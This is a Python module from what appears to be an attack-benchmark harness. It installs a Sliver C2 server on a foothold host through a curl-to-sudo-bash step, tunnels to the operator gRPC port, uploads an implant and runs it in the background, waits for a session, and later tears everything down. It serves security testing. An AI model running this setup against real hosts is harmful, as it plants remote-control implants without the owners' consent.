"""Sliver C2 lifecycle — stands a Sliver server up on the foothold, tunnels to its operator gRPC, and waits for a session."""
from __future__ import annotations

import asyncio
import json
import os
import shlex
import signal
import subprocess
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

from ...env_spec import AttackerSetupAccess
from ..base import PreparedAttacker

_STATE_DIR = Path("/tmp/mhbench-sliver-c2")
_GRPC_PORT = 31337
_LISTENER_PORT = 8443
_SLIVER_INSTALL = "https://sliver.sh/install"


@dataclass
class SliverPreparedC2(PreparedAttacker):
    """Sliver setup() output carried on the opaque baton for the plugin's own build_config()/run()."""
    operator_cfg: Optional[str] = None
    listener_addr: Optional[str] = None
    control_port: Optional[int] = None


def _statefile(experiment_name: str) -> Path:
    return _STATE_DIR / f"{experiment_name}.json"


def _ssh(access: AttackerSetupAccess) -> list[str]:
    """ssh argv to the foothold over the env-provided AttackerSetupAccess."""
    args = ["ssh"]
    if access.ssh_key:
        args += ["-i", os.path.expanduser(access.ssh_key)]
    args += ["-p", str(access.port), "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
             "-o", "UserKnownHostsFile=/dev/null", "-o", "LogLevel=ERROR", "-o", "ConnectTimeout=15",
             "-o", "ServerAliveInterval=30", "-o", "ServerAliveCountMax=3"]
    if access.ssh_common_args:
        args += shlex.split(access.ssh_common_args)
    args += [f"{access.user}@{access.host}"]
    return args


async def _ssh_run(access: AttackerSetupAccess, remote_cmd: str, timeout: int = 600) -> tuple[int, str]:
    proc = await asyncio.create_subprocess_exec(
        *_ssh(access), remote_cmd,
        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT)
    try:
        out, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        proc.kill()
        return 124, "timeout"
    return proc.returncode, out.decode("utf-8", "replace")


def _free_local_port() -> int:
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]
    finally:
        s.close()


def _wait_for_port(host: str, port: int, timeout: int = 60) -> bool:
    """Poll a TCP connect until the port accepts or timeout."""
    import socket
    import time as _t
    deadline = _t.time() + timeout
    while _t.time() < deadline:
        try:
            with socket.create_connection((host, port), timeout=3):
                return True
        except OSError:
            _t.sleep(1)
    return False


async def _run_sliver_ops(cfg, subcmd: str, args: list[str], timeout: int = 300) -> tuple[int, str]:
    """Run _sliver_ops.py under the dedicated sliver venv. Return (returncode, stdout)."""
    helper = Path(__file__).parent / "_sliver_ops.py"
    proc = await asyncio.create_subprocess_exec(
        str(cfg.get_sliver_python()), str(helper), subcmd, *args,
        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT)
    try:
        out, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        proc.kill()
        return 124, "timeout"
    return proc.returncode, out.decode("utf-8", "replace")


async def setup_c2(experiment_name: str, cfg, access: AttackerSetupAccess, bastion_ip: Optional[str] = None) -> SliverPreparedC2:
    """Bring the Sliver C2 up on the foothold and return once the initial session is in."""
    if access is None or not access.host:
        raise RuntimeError(f"[sliver-c2] need a foothold AttackerSetupAccess with a host (got {access!r})")
    _STATE_DIR.mkdir(parents=True, exist_ok=True)
    foothold = access.host
    work = _STATE_DIR / experiment_name
    work.mkdir(parents=True, exist_ok=True)

    rc, out = await _ssh_run(access,
        "command -v sliver-server >/dev/null || ("
        "export DEBIAN_FRONTEND=noninteractive && apt-get update -qq && curl -fsSL %s | sudo bash)"
        % shlex.quote(_SLIVER_INSTALL),
        timeout=1200)
    if rc != 0:
        raise RuntimeError(f"[sliver-c2] sliver-server install on foothold failed (rc={rc}): {out[-500:]}")

    await _ssh_run(access,
        'SS="$(command -v sliver-server 2>/dev/null || echo /root/sliver-server)"; '
        "pgrep -f 'sliver-server daemon' >/dev/null || "
        '(setsid "$SS" daemon >/var/log/sliver-server.log 2>&1 < /dev/null &)', timeout=120)

    rc0, out0 = await _ssh_run(access,
        'SS="$(command -v sliver-server 2>/dev/null || echo /root/sliver-server)"; '
        '"$SS" operator --name op --lhost 127.0.0.1 --permissions all --save /tmp/op.cfg',
        timeout=120)
    rc, cfg_text = await _ssh_run(access, "cat /tmp/op.cfg", timeout=60)
    brace = cfg_text.find("{")
    if rc != 0 or brace < 0:
        raise RuntimeError(f"[sliver-c2] could not read operator config (operator rc={rc0}): "
                           f"{out0[-300:]} | cat tail: {cfg_text[-200:]}")
    try:
        cfg_json = json.loads(cfg_text[brace:])
    except ValueError as e:
        raise RuntimeError(f"[sliver-c2] operator config from foothold is not valid JSON ({e}): {cfg_text[brace:][:200]}")
    operator_cfg = work / "operator.cfg"

    local_port = _free_local_port()
    cfg_json["lport"] = local_port
    cfg_json["lhost"] = "127.0.0.1"
    operator_cfg.write_text(json.dumps(cfg_json))
    tunnel_log = work / "tunnel.log"
    tunnel = _open_tunnel(access, local_port, _GRPC_PORT, tunnel_log)

    try:
        loop = asyncio.get_event_loop()
        if not await loop.run_in_executor(None, _wait_for_port, "127.0.0.1", local_port, 60):
            tail = tunnel_log.read_text()[-500:] if tunnel_log.exists() else "(no tunnel log)"
            raise RuntimeError(f"[sliver-c2] operator-gRPC tunnel 127.0.0.1:{local_port} never came up; tunnel log: {tail}")

        implant = work / "implant"
        rc, out = await _run_sliver_ops(cfg, "provision", [
            "--cfg", str(operator_cfg), "--listener-host", foothold,
            "--listener-port", str(_LISTENER_PORT), "--out", str(implant)], timeout=600)
        if rc != 0:
            raise RuntimeError(f"[sliver-c2] implant/listener provision failed (rc={rc}): {out[-600:]}")

        with open(implant, "rb") as f:
            put = await asyncio.create_subprocess_exec(
                *_ssh(access), "cat > /tmp/implant && chmod +x /tmp/implant",
                stdin=f, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.PIPE)
            await put.communicate()
        await _ssh_run(access, "setsid /tmp/implant >/dev/null 2>&1 < /dev/null &", timeout=60)

        rc, out = await _run_sliver_ops(cfg, "wait", ["--cfg", str(operator_cfg), "--timeout", "180"], timeout=240)
        if rc != 0:
            raise RuntimeError(f"[sliver-c2] no Sliver session beaconed in: {out[-400:]}")
    except Exception:
        _kill_pid(tunnel.pid)
        raise

    _statefile(experiment_name).write_text(json.dumps({
        "tunnel_pid": tunnel.pid, "foothold": foothold, "local_port": local_port,
        "access": access.model_dump(),
    }))
    listener_addr = f"{foothold}:{_LISTENER_PORT}"
    return SliverPreparedC2(operator_cfg=str(operator_cfg), listener_addr=listener_addr, control_port=local_port)


def _open_tunnel(access: AttackerSetupAccess, local_port: int, remote_port: int, log_path: Path) -> subprocess.Popen:
    """Resilient supervised ssh -L tunnel to the foothold operator gRPC through the bastion."""
    ssh_tunnel = ["ssh", "-N", "-o", "ExitOnForwardFailure=yes", "-o", "ServerAliveInterval=30",
                  "-o", "ServerAliveCountMax=6", "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
                  "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=15", "-p", str(access.port)]
    if access.ssh_key:
        ssh_tunnel += ["-i", os.path.expanduser(access.ssh_key)]
    if access.ssh_common_args:
        ssh_tunnel += shlex.split(access.ssh_common_args)
    ssh_tunnel += ["-L", f"127.0.0.1:{local_port}:127.0.0.1:{remote_port}", f"{access.user}@{access.host}"]
    supervisor = "while true; do " + " ".join(shlex.quote(a) for a in ssh_tunnel) + "; sleep 2; done"
    log_f = open(log_path, "a")
    log_f.write("=== tunnel supervisor: " + " ".join(shlex.quote(a) for a in ssh_tunnel) + " ===\n")
    log_f.flush()
    return subprocess.Popen(["bash", "-c", supervisor], stdout=log_f,
                            stderr=subprocess.STDOUT, start_new_session=True)


def _kill_pid(pid: int) -> None:
    for sig in (signal.SIGTERM, signal.SIGKILL):
        try:
            os.killpg(os.getpgid(pid), sig)
        except ProcessLookupError:
            return
        except Exception:
            try:
                os.kill(pid, sig)
            except Exception:
                return


def teardown_c2(experiment_name: str, cfg=None) -> None:
    """Stop the tunnel and the Sliver server/implant on the foothold. Keyed by experiment_name."""
    sf = _statefile(experiment_name)
    try:
        state = json.loads(sf.read_text())
    except Exception:
        return
    pid = state.get("tunnel_pid")
    if isinstance(pid, int):
        _kill_pid(pid)
    acc = state.get("access")
    if acc:
        try:
            access = AttackerSetupAccess.model_validate(acc)
            subprocess.run(_ssh(access) + [
                "pkill -f 'sliver-server daemon'; pkill -f /tmp/implant; rm -f /tmp/implant /tmp/op.cfg || true"],
                timeout=120, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass
    try:
        sf.unlink()
    except Exception:
        pass
